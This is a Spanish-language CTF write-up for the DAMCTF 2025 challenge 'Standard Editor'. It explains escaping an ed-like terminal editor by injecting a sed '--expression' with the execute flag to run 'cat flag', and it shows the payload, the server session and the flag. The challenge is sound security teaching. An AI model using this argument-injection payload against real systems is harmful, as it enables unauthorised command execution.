---
title: Standard Editor - DAMCTF2025
author: Kesero
description: Reto basado escapar de un programa de apuntes por terminal mediante command injections
date: 2025-05-11 10:00:00 +0000
categories: [Writeups Competiciones Internacionales, Miscelánea]
tags: [Misc, Writeups, Dificultad - Media, Misc - Jail]
pin: false
math: true
mermaid: true
image:
  path: https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/Damctf2025/Misc/Standard-Editor/img/2.png
  lqip: 
  alt: 
comments: true
---
Autor del reto: `evan`

Dificultad: <font color=orange>Media</font>

## Enunciado

"Joel Fagliano has nothing on me. (flag is all caps)"

## Archivos

Este reto nos da el siguiente archivo.

- `conexión por netcat` : Contiene la conexión directa con el servidor del reto.

Archivos utilizados [aquí](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/Damctf2025/Misc/Standard-Editor).

## Analizando el reto

Al conectarnos por netcat podemos ver el siguiente mensaje.

```
    ┌──(kesero㉿kali)-[~]
    └─$ nc standard-editor.chals.damctf.xyz 6733

    [Sun May 11 20:22:15 UTC 2025] Welcome, editor!
    Feel free to write in this temporary scratch space.
    All data will be deleted when you're done, but files will
    first be printed to stdout in case you want to keep them.
    
    a
    ?
    b
    ?
    c
    ?

```

## Solver

En este reto tendremos que realizar un command injection a través del editor simulado que nos dan en el reto. Para ello como siempre en estos casos, tendremos que probar, probar y probar todo lo posible para observar cómo se comporta el servidor.

La primera suposición que podemos realizar es que el editor se trata de un editor de línea de comandos personalizados emulando algo parecido a el programa `ed`.

Por ejemplo, si queremos añadir líneas en este tipo de editores, con el comando `a` significa `append` y podemos añadir líneas al editor. Además si queremos finalizar la entrada de líneas, lo realizaremos mediante `.`. Ocurre de forma parecida con el comando `w` el cual nos permite ejecutar comandos.

Además, realizando pruebas podemos observar que las expresiones regulares están permitidas ya que observaremos que estamos habilitados para evaluar expresiones de sustitución.

Después de muchos intentos damos con el código para leer la flag. 

```
a
.
w --expression=s@.*@cd\ ..\;\ cd\ ..\;\ cat\ flag@e
a
bruh
.
w f
q
```
Vamos a explicarlo línea por línea.

1. `a` empezamos a añadir líneas.
2. `.` finalizamos la entrada de líneas
3. `w --expression=s@.*@cd\ ..\;\ cd\ ..\;\ cat\ flag@e`. Para comenzar, `w` permite escribir, `--expression=` nos permite evaluar y ejecuar a continuación. Por otro lado dentro de la expresión tenemos `s@.*@cd\ ..\;\ cd\ ..\;\ cat\ flag@e`. En la cual `s@.*@...@e` es una expresión de sustitución de `sed` con la flag `e`, que ejecuta el resultado como un comando de sistema.
Posteriormente, `.*` fuerza a capturar cualquier línea dentro del archivo. Acto seguido se sustituye por `cd ..; cd ..; cat flag` que cambia dos niveles arriba en el sistema de archivos y luego ejecuta `cat flag`

4. `a, bruh, .` Con esta combinación forzamos a que se ejecute el procesamiento de la expresión anterior.

5. `w f` Finalmente grabamos el contenido con `f` y guardamos el contenido. De esta manera, forzamos al sistema que interprete la expresión con ejecución.

6. `q` Por último, salimos del programa.

Realizando los pasos anteriores, obtenemos la flag.

```
  ┌──(kesero㉿kali)-[~]
  └─$ nc standard-editor.chals.damctf.xyz 6733

  [Mon May 12 16:19:16 UTC 2025] Welcome, editor!
  Feel free to write in this temporary scratch space.
  All data will be deleted when you're done, but files will
  first be printed to stdout in case you want to keep them.
  a
  .
  w --expression=s@.*@cd\ ..\;\ 
  cd\ ..\;\ cat\ flag@e
  0
  a
  bruh
  .
  w f
  5
  q
  sed: can't read s@vi\|vim\|emacs\|nano\|vscode\|notepad[+][+]\|code\|zed\|atom\|word\|office\|docs\|o365\|copilot\|cursor@ed(1)@ig: No such file or directory
  dam{is_it_w31rd_that_i_u53_ed(1)_4_fun?}
```

## Flag
`dam{is_it_w31rd_that_i_u53_ed(1)_4_fun?}`